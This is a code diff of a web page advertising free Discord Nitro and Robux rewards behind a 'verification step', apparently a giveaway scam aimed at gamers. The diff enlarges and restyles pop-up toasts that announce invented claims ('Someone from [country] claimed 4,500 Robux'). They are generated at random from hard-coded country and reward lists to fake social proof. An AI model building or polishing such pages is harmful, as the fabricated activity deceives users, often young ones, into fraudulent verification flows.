@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* [Your existing full CSS from previous code – exactly the same, but without any admin styles] */
+    /* Your full existing CSS – only the toast sizes are made larger */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -188,40 +188,77 @@
     }
     .faq-item.open .faq-answer { margin-top: 0.6rem; max-height: 200px; opacity: 1; }
     footer { text-align: center; font-size: 0.7rem; color: #7a7f9e; margin-top: 1.2rem; font-weight: 500; }
+
+    /* ----- EVEN LARGER ACTIVITY TOASTS ----- */
     .activity-toasts {
       position: fixed;
-      bottom: 20px;
-      left: 20px;
+      bottom: 28px;
+      left: 28px;
       z-index: 1000;
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: 16px;
       pointer-events: none;
     }
     .activity-toast {
       background: #1a1c2a;
-      backdrop-filter: blur(12px);
-      border-radius: 12px;
-      padding: 0.7rem 1rem;
-      min-width: 240px;
-      max-width: 300px;
+      backdrop-filter: blur(14px);
+      border-radius: 1.25rem;
+      padding: 1.2rem 1.4rem;
+      min-width: 320px;
+      max-width: 400px;
       display: flex;
       align-items: center;
-      gap: 0.8rem;
+      gap: 1.2rem;
       animation: slideInLeft 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-      border-left: 3px solid #f5b042;
+      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5);
+      border-left: 5px solid;
     }
     .toast-nitro { border-left-color: #5865f2; }
     .toast-robux { border-left-color: #f5b042; }
-    .toast-icon { width: 40px; height: 40px; background: #0f1119; border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-    .toast-icon img { width: 28px; height: 28px; object-fit: contain; }
-    .toast-content { flex: 1; }
-    .toast-header { font-size: 0.7rem; color: #c0c5e0; margin-bottom: 3px; }
-    .toast-header strong { color: #fff; font-weight: 600; }
-    .toast-reward { font-weight: 700; font-size: 0.9rem; color: #fff; margin-bottom: 4px; line-height: 1.2; }
-    .toast-time { font-size: 0.6rem; color: #6a6f90; }
-    @keyframes slideInLeft { from { opacity: 0; transform: translateX(-40px); } to { opacity: 1; transform: translateX(0); } }
+    .toast-icon {
+      width: 56px;
+      height: 56px;
+      background: #0f1119;
+      border-radius: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .toast-icon img {
+      width: 40px;
+      height: 40px;
+      object-fit: contain;
+    }
+    .toast-content {
+      flex: 1;
+    }
+    .toast-header {
+      font-size: 0.85rem;
+      color: #c0c5e0;
+      margin-bottom: 6px;
+    }
+    .toast-header strong {
+      color: #fff;
+      font-weight: 600;
+    }
+    .toast-reward {
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: #fff;
+      margin-bottom: 6px;
+      line-height: 1.3;
+    }
+    .toast-time {
+      font-size: 0.75rem;
+      color: #8a8fb0;
+    }
+    @keyframes slideInLeft {
+      from { opacity: 0; transform: translateX(-40px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
     @media (max-width: 500px) {
       body { padding: 1rem; }
       .card { padding: 1.2rem; }
@@ -229,12 +266,17 @@
       .reward-card { padding: 0.7rem 0.8rem; gap: 0.8rem; }
       .reward-icon { width: 42px; height: 42px; }
       .reward-icon img { width: 30px; height: 30px; }
-      .activity-toasts { bottom: 12px; left: 12px; }
-      .activity-toast { min-width: 200px; padding: 0.5rem 0.8rem; }
-      .toast-icon { width: 32px; height: 32px; }
-      .toast-icon img { width: 24px; height: 24px; }
+      .activity-toasts { bottom: 16px; left: 16px; gap: 12px; }
+      .activity-toast { min-width: 260px; max-width: 320px; padding: 0.9rem 1rem; gap: 0.8rem; }
+      .toast-icon { width: 44px; height: 44px; }
+      .toast-icon img { width: 30px; height: 30px; }
+      .toast-header { font-size: 0.75rem; }
+      .toast-reward { font-size: 0.95rem; }
+      .toast-time { font-size: 0.65rem; }
     }
-    @media (min-width: 768px) and (max-width: 1024px) { .wrap { width: min(600px, 90%); } }
+    @media (min-width: 768px) and (max-width: 1024px) {
+      .wrap { width: min(600px, 90%); }
+    }
     .hidden { display: none; }
   </style>
 </head>
@@ -421,8 +463,16 @@
       });
     });
 
-    // Social proof toasts (countries list)
-    const countryNames = ["United States","United Kingdom","Canada","Australia","France","Germany","Italy","Spain","Japan","South Korea","India","Brazil","Mexico","Netherlands","Sweden","Norway","Switzerland","Ireland","New Zealand","Portugal","Greece","Poland","Turkey","Egypt","South Africa","Nigeria","Morocco","Saudi Arabia","United Arab Emirates","Qatar","Israel","Pakistan","Bangladesh","Thailand","Vietnam","Philippines","Indonesia","Malaysia","Singapore","Taiwan","Argentina","Chile","Colombia","Peru","Venezuela","Jamaica","Iceland","Austria","Belgium","Finland","Denmark","Czech Republic","Hungary","Romania"];
+    // Social proof toasts – even larger version (as styled above)
+    const countryNames = [
+      "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
+      "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
+      "Ireland", "New Zealand", "Portugal", "Greece", "Poland", "Turkey", "Egypt", "South Africa",
+      "Nigeria", "Morocco", "Saudi Arabia", "United Arab Emirates", "Qatar", "Israel", "Pakistan",
+      "Bangladesh", "Thailand", "Vietnam", "Philippines", "Indonesia", "Malaysia", "Singapore", "Taiwan",
+      "Argentina", "Chile", "Colombia", "Peru", "Venezuela", "Jamaica", "Iceland", "Austria", "Belgium",
+      "Finland", "Denmark", "Czech Republic", "Hungary", "Romania"
+    ];
     const activityRewards = [
       { name: "Nitro Boost", type: "nitro", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" },
       { name: "4,500 Robux", type: "robux", icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp" },
@@ -450,7 +500,14 @@
       const toastType = reward.type === 'nitro' ? 'toast-nitro' : 'toast-robux';
       const toast = document.createElement('div');
       toast.className = `activity-toast ${toastType}`;
-      toast.innerHTML = `<div class="toast-icon"><img src="${reward.icon}" alt="${reward.name}"></div><div class="toast-content"><div class="toast-header">Someone from <strong>${country}</strong> claimed</div><div class="toast-reward">${reward.name}</div><div class="toast-time">${timeText}</div></div>`;
+      toast.innerHTML = `
+        <div class="toast-icon"><img src="${reward.icon}" alt="${reward.name}"></div>
+        <div class="toast-content">
+          <div class="toast-header">Someone from <strong>${country}</strong> claimed</div>
+          <div class="toast-reward">${reward.name}</div>
+          <div class="toast-time">${timeText}</div>
+        </div>
+      `;
       toastContainer.prepend(toast);
       while (toastContainer.children.length > 3) toastContainer.lastElementChild.remove();
       setTimeout(() => {
